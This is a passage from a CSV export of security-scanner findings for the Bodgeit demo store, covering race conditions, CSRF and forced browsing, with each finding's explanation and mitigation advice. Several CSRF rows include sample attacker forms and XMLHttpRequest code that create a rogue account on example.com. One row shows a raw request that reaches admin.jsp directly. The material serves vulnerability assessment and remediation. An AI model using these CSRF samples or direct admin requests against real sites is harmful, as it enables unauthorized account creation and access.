<Content>Generally speaking, a byte array potentially containing noncharacter data should never be converted into a <code>String</code> object as it may break functionality, but in some cases this can cause much larger security concerns. In a lot of cases there is no need to actually convert a byte array into a String, but if there is a specific reason to be able to create a <code>String</code> object from binary data, it must first be encoded in a way such that it will fit into the default character set. <b>Example 2:</b> The following uses a different variant of the API in Example 1 to prevent any validation problems. <pre> ... FileInputStream fis = new FileInputStream(myFile); byte[] byteArr = byte[BUFSIZE]; ... int count = fis.read(byteArr); ... byte[] fileSHA256 = DigestUtils.sha256(byteArr); // use fileSHA256 to validate file, comparing hash byte-by-byte. ... </pre> In this case it is straightforward to rectify, since this API has overloaded variants including one that accepts a byte array, and this could be simplified even further by using another overloaded variant of <code>DigestUtils.sha256()</code> that accepts a <code>FileInputStream</code> object as its argument. Other scenarios may need careful consideration as to whether it's possible that the byte array could contain data outside of the character set, and further refactoring may be required.</Content>","","",""
"DemoApps","","Bodgeit","343","Race_Condition_Format_Flaw","","Low","Open","2015-10-15","Checkmarx","362","Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","346","Race_Condition_Format_Flaw","","Low","Open","2015-10-15","Checkmarx","362","Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","378","Race_Condition_Format_Flaw","","Low","Open","2015-10-15","Checkmarx","362","Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","488","Race_Condition_Format_Flaw","","Low","Open","2015-10-15","Checkmarx","362","Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')","","/bodgeit/root/home.jsp","","","http://localhost/bodgeit/root/home.jsp","","","","","","","",""
"DemoApps","","Bodgeit","394","Race_Condition_Format_Flaw","","Low","Open","2015-10-15","Checkmarx","362","Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')","","/bodgeit/root/product.jsp","","","http://localhost/bodgeit/root/product.jsp","","","","","","","",""
"DemoApps","","Bodgeit","616","Race_Condition_Format_Flaw","","Low","Open","2015-10-15","Checkmarx","362","Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')","","/bodgeit/root/product.jsp","","","http://localhost/bodgeit/root/product.jsp","","","","","","","",""
"DemoApps","","Bodgeit","239","Cross-Site Request Forgery","","Low","Open","2015-10-15","Fortify SCA","352","Cross-Site Request Forgery (CSRF)","A8","root/advanced.jsp","","","http://localhost/root/advanced.jsp","","","","Abstract: <Content><Paragraph>The form post at <Replace key=""PrimaryLocation.file""/> line <Replace key=""PrimaryLocation.line""/> must contain a user-specific secret in order to prevent an attacker from making unauthorized requests.<AltParagraph>Form posts must contain a user-specific secret in order to prevent an attacker from making unauthorized requests.</AltParagraph></Paragraph></Content> Explanation: <Content>A cross-site request forgery (CSRF) vulnerability occurs when: 1. A Web application uses session cookies. 2. The application acts on an HTTP request without verifying that the request was made with the user's consent. <Paragraph> In this case the application generates HTTP request via a form post at <Replace key=""PrimaryLocation.file""/> line <Replace key=""PrimaryLocation.line""/>. </Paragraph> A nonce is a cryptographic random value that is sent with a message to prevent replay attacks. If the request does not contain a nonce that proves its provenance, the code that handles the request is vulnerable to a CSRF attack (unless it does not change the state of the application). This means a Web application that uses session cookies has to take special precautions in order to ensure that an attacker can't trick users into submitting bogus requests. Imagine a Web application that allows administrators to create new accounts by submitting this form: <pre> &lt;form method=""POST"" action=""/new_user"" &gt; Name of new user: &lt;input type=""text"" name=""username""&gt; Password for new user: &lt;input type=""password"" name=""user_passwd""&gt; &lt;input type=""submit"" name=""action"" value=""Create User""&gt; &lt;/form&gt; </pre> An attacker might set up a Web site with the following: <pre> &lt;form method=""POST"" action=""http://www.example.com/new_user""&gt; &lt;input type=""hidden"" name=""username"" value=""hacker""&gt; &lt;input type=""hidden"" name=""user_passwd"" value=""hacked""&gt; &lt;/form&gt; &lt;script&gt; document.usr_form.submit(); &lt;/script&gt; </pre> If an administrator for example.com visits the malicious page while she has an active session on the site, she will unwittingly create an account for the attacker. This is a CSRF attack. It is possible because the application does not have a way to determine the provenance of the request. Any request could be a legitimate action chosen by the user or a faked action set up by an attacker. The attacker does not get to see the Web page that the bogus request generates, so the attack technique is only useful for requests that alter the state of the application. Most Web browsers send an HTTP header named <code>referer</code> along with each request. The <code>referer</code> header is supposed to contain the URL of the referring page, but attackers can forge it, so the referer header is not useful for determining the provenance of a request. Applications that pass the session identifier in the URL rather than as a cookie do not have CSRF problems because there is no way for the attacker to access the session identifier and include it as part of the bogus request. CSRF is entry number five on the 2007 OWASP Top 10 list.</Content>","Recommendations: <Content>Applications that use session cookies must include some piece of information in every form post that the back-end code can use to validate the provenance of the request. One way to do that is to include a random request identifier or nonce, like this: <pre> RequestBuilder rb = new RequestBuilder(RequestBuilder.POST, ""/new_user""); body = addToPost(body, new_username); body = addToPost(body, new_passwd); body = addToPost(body, request_id); rb.sendRequest(body, new NewAccountCallback(callback)); </pre> Then the back-end logic can validate the request identifier before processing the rest of the form data. When possible, the request identifier should be unique to each server request rather than shared across every request for a particular session. As with session identifiers, the harder it is for an attacker to guess the request identifier, the harder it is to conduct a successful CSRF attack. The token should not be easily guessed and it should be protected in the same way that session tokens are protected, such as using SSLv3. Additional mitigation techniques include: <b>Framework protection:</b> Most modern web application frameworks embed CSRF protection and they will automatically include and verify CSRF tokens. <b>Use a Challenge-Response control:</b> Forcing the customer to respond to a challenge sent by the server is a strong defense against CSRF. Some of the challenges that can be used for this purpose are: CAPTCHAs, password re-authentication and one-time tokens. <b>Check HTTP Referer/Origin headers:</b> An attacked won't be able to spoof these headers while performing a CSRF attack. This makes these headers a useful method to prevent CSRF attacks. <b>Double-submit Session Cookie:</b> Sending the session ID Cookie as a hidden form value in addition to the actual session ID Cookie is a good protection against CSRF attacks. The server will check both values and make sure they are identical before processing the rest of the form data. If an attacker submits a form in behalf of a user, he won't be able to modify the session ID cookie value as per the same-origin-policy. <b>Limit Session Lifetime:</b> When accessing protected resources using a CSRF attack, the attack will only be valid as long as the session ID sent as part of the attack is still valid on the server. Limiting the Session lifetime will reduce the probability of a successful attack. The techniques described here can be defeated with XSS attacks. Effective CSRF mitigation includes XSS mitigation techniques. </Content> Tips: 1.SCA flags all HTML forms and XMLHttpRequest objects that might perform a POST operation. The auditor must determine if each form could be valuable to an attacker as a CSRF target and whether or not an appropriate mitigation technique is in place.","","",""
"DemoApps","","Bodgeit","215","Cross-Site Request Forgery","","Low","Open","2015-10-15","Fortify SCA","352","Cross-Site Request Forgery (CSRF)","A8","root/js/advanced.js","","","http://localhost/root/js/advanced.js","","","","Abstract: <Content><Paragraph>The HTTP request at <Replace key=""PrimaryLocation.file""/> line <Replace key=""PrimaryLocation.line""/> must contain a user-specific secret in order to prevent an attacker from making unauthorized requests.<AltParagraph>HTTP requests must contain a user-specific secret in order to prevent an attacker from making unauthorized requests.</AltParagraph></Paragraph></Content> Explanation: <Content>A cross-site request forgery (CSRF) vulnerability occurs when: 1. A web application uses session cookies. 2. The application acts on an HTTP request without verifying that the request was made with the user's consent. <Paragraph> In this case the application generates an HTTP request at <Replace key=""PrimaryLocation.file""/> line <Replace key=""PrimaryLocation.line""/>. </Paragraph> A nonce is a cryptographic random value that is sent with a message to prevent replay attacks. If the request does not contain a nonce that proves its provenance, the code that handles the request is vulnerable to a CSRF attack (unless it does not change the state of the application). This means a web application that uses session cookies has to take special precautions in order to ensure that an attacker can't trick users into submitting bogus requests. Imagine a web application that allows administrators to create new accounts as follows: <pre> var req = new XMLHttpRequest(); req.open(""POST"", ""/new_user"", true); body = addToPost(body, new_username); body = addToPost(body, new_passwd); req.send(body); </pre> An attacker might set up a malicious web site that contains the following code. <pre> var req = new XMLHttpRequest(); req.open(""POST"", ""http://www.example.com/new_user"", true); body = addToPost(body, ""attacker""); body = addToPost(body, ""haha""); req.send(body); </pre> If an administrator for the vulnerable site visits a page containing this code while she has an active session, she will unwittingly create an account for the attacker. This is a CSRF attack. It is possible because the application does not have a way to determine the provenance of the request. Any request could be a legitimate action chosen by the user or a faked action set up by an attacker. The attacker does not get to see the web page that the bogus request generates, so the attack technique is only useful for requests that alter the state of the application. Most web browsers send an HTTP header named <code>referer</code> along with each request. The <code>referer</code> header is supposed to contain the URL of the referring page, but attackers can forge it, so the referer header is not useful for determining the provenance of a request. Applications that pass the session identifier in the URL rather than as a cookie do not have CSRF problems because there is no way for the attacker to access the session identifier and include it as part of the bogus request. CSRF is entry number five on the 2007 OWASP Top 10 list.</Content>","Recommendations: <Content>Applications that use session cookies must include some piece of information in every form post that the back-end code can use to validate the provenance of the request. One way to do that is to include a random request identifier or nonce, like this: <pre> RequestBuilder rb = new RequestBuilder(RequestBuilder.POST, ""/new_user""); body = addToPost(body, new_username); body = addToPost(body, new_passwd); body = addToPost(body, request_id); rb.sendRequest(body, new NewAccountCallback(callback)); </pre> Then the back-end logic can validate the request identifier before processing the rest of the form data. When possible, the request identifier should be unique to each server request rather than shared across every request for a particular session. As with session identifiers, the harder it is for an attacker to guess the request identifier, the harder it is to conduct a successful CSRF attack. The token should not be easily guessed and it should be protected in the same way that session tokens are protected, such as using SSLv3. Additional mitigation techniques include: <b>Framework protection:</b> Most modern web application frameworks embed CSRF protection and they will automatically include and verify CSRF tokens. <b>Use a Challenge-Response control:</b> Forcing the customer to respond to a challenge sent by the server is a strong defense against CSRF. Some of the challenges that can be used for this purpose are: CAPTCHAs, password re-authentication and one-time tokens. <b>Check HTTP Referer/Origin headers:</b> An attacked won't be able to spoof these headers while performing a CSRF attack. This makes these headers a useful method to prevent CSRF attacks. <b>Double-submit Session Cookie:</b> Sending the session ID Cookie as a hidden form value in addition to the actual session ID Cookie is a good protection against CSRF attacks. The server will check both values and make sure they are identical before processing the rest of the form data. If an attacker submits a form in behalf of a user, he won't be able to modify the session ID cookie value as per the same-origin-policy. <b>Limit Session Lifetime:</b> When accessing protected resources using a CSRF attack, the attack will only be valid as long as the session ID sent as part of the attack is still valid on the server. Limiting the Session lifetime will reduce the probability of a successful attack. The techniques described here can be defeated with XSS attacks. Effective CSRF mitigation includes XSS mitigation techniques. </Content> Tips: 1.SCA flags all HTML forms and all XMLHttpRequest objects that might perform a POST operation. The auditor must determine if each form could be valuable to an attacker as a CSRF target and whether or not an appropriate mitigation technique is in place.","","",""
"DemoApps","","Bodgeit","216","Cross-Site Request Forgery","","Low","Open","2015-10-15","Fortify SCA","352","Cross-Site Request Forgery (CSRF)","A8","root/js/advanced.js","","","http://localhost/root/js/advanced.js","","","","Abstract: <Content><Paragraph>The HTTP request at <Replace key=""PrimaryLocation.file""/> line <Replace key=""PrimaryLocation.line""/> must contain a user-specific secret in order to prevent an attacker from making unauthorized requests.<AltParagraph>HTTP requests must contain a user-specific secret in order to prevent an attacker from making unauthorized requests.</AltParagraph></Paragraph></Content> Explanation: <Content>A cross-site request forgery (CSRF) vulnerability occurs when: 1. A web application uses session cookies. 2. The application acts on an HTTP request without verifying that the request was made with the user's consent. <Paragraph> In this case the application generates an HTTP request at <Replace key=""PrimaryLocation.file""/> line <Replace key=""PrimaryLocation.line""/>. </Paragraph> A nonce is a cryptographic random value that is sent with a message to prevent replay attacks. If the request does not contain a nonce that proves its provenance, the code that handles the request is vulnerable to a CSRF attack (unless it does not change the state of the application). This means a web application that uses session cookies has to take special precautions in order to ensure that an attacker can't trick users into submitting bogus requests. Imagine a web application that allows administrators to create new accounts as follows: <pre> var req = new XMLHttpRequest(); req.open(""POST"", ""/new_user"", true); body = addToPost(body, new_username); body = addToPost(body, new_passwd); req.send(body); </pre> An attacker might set up a malicious web site that contains the following code. <pre> var req = new XMLHttpRequest(); req.open(""POST"", ""http://www.example.com/new_user"", true); body = addToPost(body, ""attacker""); body = addToPost(body, ""haha""); req.send(body); </pre> If an administrator for the vulnerable site visits a page containing this code while she has an active session, she will unwittingly create an account for the attacker. This is a CSRF attack. It is possible because the application does not have a way to determine the provenance of the request. Any request could be a legitimate action chosen by the user or a faked action set up by an attacker. The attacker does not get to see the web page that the bogus request generates, so the attack technique is only useful for requests that alter the state of the application. Most web browsers send an HTTP header named <code>referer</code> along with each request. The <code>referer</code> header is supposed to contain the URL of the referring page, but attackers can forge it, so the referer header is not useful for determining the provenance of a request. Applications that pass the session identifier in the URL rather than as a cookie do not have CSRF problems because there is no way for the attacker to access the session identifier and include it as part of the bogus request. CSRF is entry number five on the 2007 OWASP Top 10 list.</Content>","Recommendations: <Content>Applications that use session cookies must include some piece of information in every form post that the back-end code can use to validate the provenance of the request. One way to do that is to include a random request identifier or nonce, like this: <pre> RequestBuilder rb = new RequestBuilder(RequestBuilder.POST, ""/new_user""); body = addToPost(body, new_username); body = addToPost(body, new_passwd); body = addToPost(body, request_id); rb.sendRequest(body, new NewAccountCallback(callback)); </pre> Then the back-end logic can validate the request identifier before processing the rest of the form data. When possible, the request identifier should be unique to each server request rather than shared across every request for a particular session. As with session identifiers, the harder it is for an attacker to guess the request identifier, the harder it is to conduct a successful CSRF attack. The token should not be easily guessed and it should be protected in the same way that session tokens are protected, such as using SSLv3. Additional mitigation techniques include: <b>Framework protection:</b> Most modern web application frameworks embed CSRF protection and they will automatically include and verify CSRF tokens. <b>Use a Challenge-Response control:</b> Forcing the customer to respond to a challenge sent by the server is a strong defense against CSRF. Some of the challenges that can be used for this purpose are: CAPTCHAs, password re-authentication and one-time tokens. <b>Check HTTP Referer/Origin headers:</b> An attacked won't be able to spoof these headers while performing a CSRF attack. This makes these headers a useful method to prevent CSRF attacks. <b>Double-submit Session Cookie:</b> Sending the session ID Cookie as a hidden form value in addition to the actual session ID Cookie is a good protection against CSRF attacks. The server will check both values and make sure they are identical before processing the rest of the form data. If an attacker submits a form in behalf of a user, he won't be able to modify the session ID cookie value as per the same-origin-policy. <b>Limit Session Lifetime:</b> When accessing protected resources using a CSRF attack, the attack will only be valid as long as the session ID sent as part of the attack is still valid on the server. Limiting the Session lifetime will reduce the probability of a successful attack. The techniques described here can be defeated with XSS attacks. Effective CSRF mitigation includes XSS mitigation techniques. </Content> Tips: 1.SCA flags all HTML forms and all XMLHttpRequest objects that might perform a POST operation. The auditor must determine if each form could be valuable to an attacker as a CSRF target and whether or not an appropriate mitigation technique is in place.","","",""
"DemoApps","","Bodgeit","262","Cross-Site Request Forgery","","Low","Open","2015-10-15","Fortify SCA","352","Cross-Site Request Forgery (CSRF)","A8","root/password.jsp","","","http://localhost/root/password.jsp","","","","Abstract: <Content><Paragraph>The form post at <Replace key=""PrimaryLocation.file""/> line <Replace key=""PrimaryLocation.line""/> must contain a user-specific secret in order to prevent an attacker from making unauthorized requests.<AltParagraph>Form posts must contain a user-specific secret in order to prevent an attacker from making unauthorized requests.</AltParagraph></Paragraph></Content> Explanation: <Content>A cross-site request forgery (CSRF) vulnerability occurs when: 1. A Web application uses session cookies. 2. The application acts on an HTTP request without verifying that the request was made with the user's consent. <Paragraph> In this case the application generates HTTP request via a form post at <Replace key=""PrimaryLocation.file""/> line <Replace key=""PrimaryLocation.line""/>. </Paragraph> A nonce is a cryptographic random value that is sent with a message to prevent replay attacks. If the request does not contain a nonce that proves its provenance, the code that handles the request is vulnerable to a CSRF attack (unless it does not change the state of the application). This means a Web application that uses session cookies has to take special precautions in order to ensure that an attacker can't trick users into submitting bogus requests. Imagine a Web application that allows administrators to create new accounts by submitting this form: <pre> &lt;form method=""POST"" action=""/new_user"" &gt; Name of new user: &lt;input type=""text"" name=""username""&gt; Password for new user: &lt;input type=""password"" name=""user_passwd""&gt; &lt;input type=""submit"" name=""action"" value=""Create User""&gt; &lt;/form&gt; </pre> An attacker might set up a Web site with the following: <pre> &lt;form method=""POST"" action=""http://www.example.com/new_user""&gt; &lt;input type=""hidden"" name=""username"" value=""hacker""&gt; &lt;input type=""hidden"" name=""user_passwd"" value=""hacked""&gt; &lt;/form&gt; &lt;script&gt; document.usr_form.submit(); &lt;/script&gt; </pre> If an administrator for example.com visits the malicious page while she has an active session on the site, she will unwittingly create an account for the attacker. This is a CSRF attack. It is possible because the application does not have a way to determine the provenance of the request. Any request could be a legitimate action chosen by the user or a faked action set up by an attacker. The attacker does not get to see the Web page that the bogus request generates, so the attack technique is only useful for requests that alter the state of the application. Most Web browsers send an HTTP header named <code>referer</code> along with each request. The <code>referer</code> header is supposed to contain the URL of the referring page, but attackers can forge it, so the referer header is not useful for determining the provenance of a request. Applications that pass the session identifier in the URL rather than as a cookie do not have CSRF problems because there is no way for the attacker to access the session identifier and include it as part of the bogus request. CSRF is entry number five on the 2007 OWASP Top 10 list.</Content>","Recommendations: <Content>Applications that use session cookies must include some piece of information in every form post that the back-end code can use to validate the provenance of the request. One way to do that is to include a random request identifier or nonce, like this: <pre> RequestBuilder rb = new RequestBuilder(RequestBuilder.POST, ""/new_user""); body = addToPost(body, new_username); body = addToPost(body, new_passwd); body = addToPost(body, request_id); rb.sendRequest(body, new NewAccountCallback(callback)); </pre> Then the back-end logic can validate the request identifier before processing the rest of the form data. When possible, the request identifier should be unique to each server request rather than shared across every request for a particular session. As with session identifiers, the harder it is for an attacker to guess the request identifier, the harder it is to conduct a successful CSRF attack. The token should not be easily guessed and it should be protected in the same way that session tokens are protected, such as using SSLv3. Additional mitigation techniques include: <b>Framework protection:</b> Most modern web application frameworks embed CSRF protection and they will automatically include and verify CSRF tokens. <b>Use a Challenge-Response control:</b> Forcing the customer to respond to a challenge sent by the server is a strong defense against CSRF. Some of the challenges that can be used for this purpose are: CAPTCHAs, password re-authentication and one-time tokens. <b>Check HTTP Referer/Origin headers:</b> An attacked won't be able to spoof these headers while performing a CSRF attack. This makes these headers a useful method to prevent CSRF attacks. <b>Double-submit Session Cookie:</b> Sending the session ID Cookie as a hidden form value in addition to the actual session ID Cookie is a good protection against CSRF attacks. The server will check both values and make sure they are identical before processing the rest of the form data. If an attacker submits a form in behalf of a user, he won't be able to modify the session ID cookie value as per the same-origin-policy. <b>Limit Session Lifetime:</b> When accessing protected resources using a CSRF attack, the attack will only be valid as long as the session ID sent as part of the attack is still valid on the server. Limiting the Session lifetime will reduce the probability of a successful attack. The techniques described here can be defeated with XSS attacks. Effective CSRF mitigation includes XSS mitigation techniques. </Content> Tips: 1.SCA flags all HTML forms and XMLHttpRequest objects that might perform a POST operation. The auditor must determine if each form could be valuable to an attacker as a CSRF target and whether or not an appropriate mitigation technique is in place.","","",""
"DemoApps","","Bodgeit","199","Cross-Site Request Forgery","","Low","Open","2015-10-15","Fortify SCA","352","Cross-Site Request Forgery (CSRF)","A8","root/register.jsp","","","http://localhost/root/register.jsp","","","","Abstract: <Content><Paragraph>The form post at <Replace key=""PrimaryLocation.file""/> line <Replace key=""PrimaryLocation.line""/> must contain a user-specific secret in order to prevent an attacker from making unauthorized requests.<AltParagraph>Form posts must contain a user-specific secret in order to prevent an attacker from making unauthorized requests.</AltParagraph></Paragraph></Content> Explanation: <Content>A cross-site request forgery (CSRF) vulnerability occurs when: 1. A Web application uses session cookies. 2. The application acts on an HTTP request without verifying that the request was made with the user's consent. <Paragraph> In this case the application generates HTTP request via a form post at <Replace key=""PrimaryLocation.file""/> line <Replace key=""PrimaryLocation.line""/>. </Paragraph> A nonce is a cryptographic random value that is sent with a message to prevent replay attacks. If the request does not contain a nonce that proves its provenance, the code that handles the request is vulnerable to a CSRF attack (unless it does not change the state of the application). This means a Web application that uses session cookies has to take special precautions in order to ensure that an attacker can't trick users into submitting bogus requests. Imagine a Web application that allows administrators to create new accounts by submitting this form: <pre> &lt;form method=""POST"" action=""/new_user"" &gt; Name of new user: &lt;input type=""text"" name=""username""&gt; Password for new user: &lt;input type=""password"" name=""user_passwd""&gt; &lt;input type=""submit"" name=""action"" value=""Create User""&gt; &lt;/form&gt; </pre> An attacker might set up a Web site with the following: <pre> &lt;form method=""POST"" action=""http://www.example.com/new_user""&gt; &lt;input type=""hidden"" name=""username"" value=""hacker""&gt; &lt;input type=""hidden"" name=""user_passwd"" value=""hacked""&gt; &lt;/form&gt; &lt;script&gt; document.usr_form.submit(); &lt;/script&gt; </pre> If an administrator for example.com visits the malicious page while she has an active session on the site, she will unwittingly create an account for the attacker. This is a CSRF attack. It is possible because the application does not have a way to determine the provenance of the request. Any request could be a legitimate action chosen by the user or a faked action set up by an attacker. The attacker does not get to see the Web page that the bogus request generates, so the attack technique is only useful for requests that alter the state of the application. Most Web browsers send an HTTP header named <code>referer</code> along with each request. The <code>referer</code> header is supposed to contain the URL of the referring page, but attackers can forge it, so the referer header is not useful for determining the provenance of a request. Applications that pass the session identifier in the URL rather than as a cookie do not have CSRF problems because there is no way for the attacker to access the session identifier and include it as part of the bogus request. CSRF is entry number five on the 2007 OWASP Top 10 list.</Content>","Recommendations: <Content>Applications that use session cookies must include some piece of information in every form post that the back-end code can use to validate the provenance of the request. One way to do that is to include a random request identifier or nonce, like this: <pre> RequestBuilder rb = new RequestBuilder(RequestBuilder.POST, ""/new_user""); body = addToPost(body, new_username); body = addToPost(body, new_passwd); body = addToPost(body, request_id); rb.sendRequest(body, new NewAccountCallback(callback)); </pre> Then the back-end logic can validate the request identifier before processing the rest of the form data. When possible, the request identifier should be unique to each server request rather than shared across every request for a particular session. As with session identifiers, the harder it is for an attacker to guess the request identifier, the harder it is to conduct a successful CSRF attack. The token should not be easily guessed and it should be protected in the same way that session tokens are protected, such as using SSLv3. Additional mitigation techniques include: <b>Framework protection:</b> Most modern web application frameworks embed CSRF protection and they will automatically include and verify CSRF tokens. <b>Use a Challenge-Response control:</b> Forcing the customer to respond to a challenge sent by the server is a strong defense against CSRF. Some of the challenges that can be used for this purpose are: CAPTCHAs, password re-authentication and one-time tokens. <b>Check HTTP Referer/Origin headers:</b> An attacked won't be able to spoof these headers while performing a CSRF attack. This makes these headers a useful method to prevent CSRF attacks. <b>Double-submit Session Cookie:</b> Sending the session ID Cookie as a hidden form value in addition to the actual session ID Cookie is a good protection against CSRF attacks. The server will check both values and make sure they are identical before processing the rest of the form data. If an attacker submits a form in behalf of a user, he won't be able to modify the session ID cookie value as per the same-origin-policy. <b>Limit Session Lifetime:</b> When accessing protected resources using a CSRF attack, the attack will only be valid as long as the session ID sent as part of the attack is still valid on the server. Limiting the Session lifetime will reduce the probability of a successful attack. The techniques described here can be defeated with XSS attacks. Effective CSRF mitigation includes XSS mitigation techniques. </Content> Tips: 1.SCA flags all HTML forms and XMLHttpRequest objects that might perform a POST operation. The auditor must determine if each form could be valuable to an attacker as a CSRF target and whether or not an appropriate mitigation technique is in place.","","",""
"DemoApps","","Bodgeit","153","Cross-Site Request Forgery","","Low","Open","2015-10-15","Fortify SCA","352","Cross-Site Request Forgery (CSRF)","A8","root/search.jsp","","","http://localhost/root/search.jsp","","","","Abstract: <Content><Paragraph>The form post at <Replace key=""PrimaryLocation.file""/> line <Replace key=""PrimaryLocation.line""/> must contain a user-specific secret in order to prevent an attacker from making unauthorized requests.<AltParagraph>Form posts must contain a user-specific secret in order to prevent an attacker from making unauthorized requests.</AltParagraph></Paragraph></Content> Explanation: <Content>A cross-site request forgery (CSRF) vulnerability occurs when: 1. A Web application uses session cookies. 2. The application acts on an HTTP request without verifying that the request was made with the user's consent. <Paragraph> In this case the application generates HTTP request via a form post at <Replace key=""PrimaryLocation.file""/> line <Replace key=""PrimaryLocation.line""/>. </Paragraph> A nonce is a cryptographic random value that is sent with a message to prevent replay attacks. If the request does not contain a nonce that proves its provenance, the code that handles the request is vulnerable to a CSRF attack (unless it does not change the state of the application). This means a Web application that uses session cookies has to take special precautions in order to ensure that an attacker can't trick users into submitting bogus requests. Imagine a Web application that allows administrators to create new accounts by submitting this form: <pre> &lt;form method=""POST"" action=""/new_user"" &gt; Name of new user: &lt;input type=""text"" name=""username""&gt; Password for new user: &lt;input type=""password"" name=""user_passwd""&gt; &lt;input type=""submit"" name=""action"" value=""Create User""&gt; &lt;/form&gt; </pre> An attacker might set up a Web site with the following: <pre> &lt;form method=""POST"" action=""http://www.example.com/new_user""&gt; &lt;input type=""hidden"" name=""username"" value=""hacker""&gt; &lt;input type=""hidden"" name=""user_passwd"" value=""hacked""&gt; &lt;/form&gt; &lt;script&gt; document.usr_form.submit(); &lt;/script&gt; </pre> If an administrator for example.com visits the malicious page while she has an active session on the site, she will unwittingly create an account for the attacker. This is a CSRF attack. It is possible because the application does not have a way to determine the provenance of the request. Any request could be a legitimate action chosen by the user or a faked action set up by an attacker. The attacker does not get to see the Web page that the bogus request generates, so the attack technique is only useful for requests that alter the state of the application. Most Web browsers send an HTTP header named <code>referer</code> along with each request. The <code>referer</code> header is supposed to contain the URL of the referring page, but attackers can forge it, so the referer header is not useful for determining the provenance of a request. Applications that pass the session identifier in the URL rather than as a cookie do not have CSRF problems because there is no way for the attacker to access the session identifier and include it as part of the bogus request. CSRF is entry number five on the 2007 OWASP Top 10 list.</Content>","Recommendations: <Content>Applications that use session cookies must include some piece of information in every form post that the back-end code can use to validate the provenance of the request. One way to do that is to include a random request identifier or nonce, like this: <pre> RequestBuilder rb = new RequestBuilder(RequestBuilder.POST, ""/new_user""); body = addToPost(body, new_username); body = addToPost(body, new_passwd); body = addToPost(body, request_id); rb.sendRequest(body, new NewAccountCallback(callback)); </pre> Then the back-end logic can validate the request identifier before processing the rest of the form data. When possible, the request identifier should be unique to each server request rather than shared across every request for a particular session. As with session identifiers, the harder it is for an attacker to guess the request identifier, the harder it is to conduct a successful CSRF attack. The token should not be easily guessed and it should be protected in the same way that session tokens are protected, such as using SSLv3. Additional mitigation techniques include: <b>Framework protection:</b> Most modern web application frameworks embed CSRF protection and they will automatically include and verify CSRF tokens. <b>Use a Challenge-Response control:</b> Forcing the customer to respond to a challenge sent by the server is a strong defense against CSRF. Some of the challenges that can be used for this purpose are: CAPTCHAs, password re-authentication and one-time tokens. <b>Check HTTP Referer/Origin headers:</b> An attacked won't be able to spoof these headers while performing a CSRF attack. This makes these headers a useful method to prevent CSRF attacks. <b>Double-submit Session Cookie:</b> Sending the session ID Cookie as a hidden form value in addition to the actual session ID Cookie is a good protection against CSRF attacks. The server will check both values and make sure they are identical before processing the rest of the form data. If an attacker submits a form in behalf of a user, he won't be able to modify the session ID cookie value as per the same-origin-policy. <b>Limit Session Lifetime:</b> When accessing protected resources using a CSRF attack, the attack will only be valid as long as the session ID sent as part of the attack is still valid on the server. Limiting the Session lifetime will reduce the probability of a successful attack. The techniques described here can be defeated with XSS attacks. Effective CSRF mitigation includes XSS mitigation techniques. </Content> Tips: 1.SCA flags all HTML forms and XMLHttpRequest objects that might perform a POST operation. The auditor must determine if each form could be valuable to an attacker as a CSRF target and whether or not an appropriate mitigation technique is in place.","","",""
"DemoApps","","Bodgeit","91","Direct Access to Administration Pages","","Low","Open","2015-10-15","IBM Security AppScan Standard","425","Direct Request ('Forced Browsing')","","/bodgeit/","admin.jsp","","http://localhost/bodgeit/","Path: /bodgeit/ -> /bodgeit/admin.jsp","GET /bodgeit/admin.jsp HTTP/1.1 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Transfer-Encoding: chunked Date: Thu, 15 Oct 2015 22:25:55 GMT Set-Cookie: JSESSIONID=EDE37A61DABCAC7B7CC7EDB0F1F31F06; Path=/bodgeit/; HttpOnly <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> 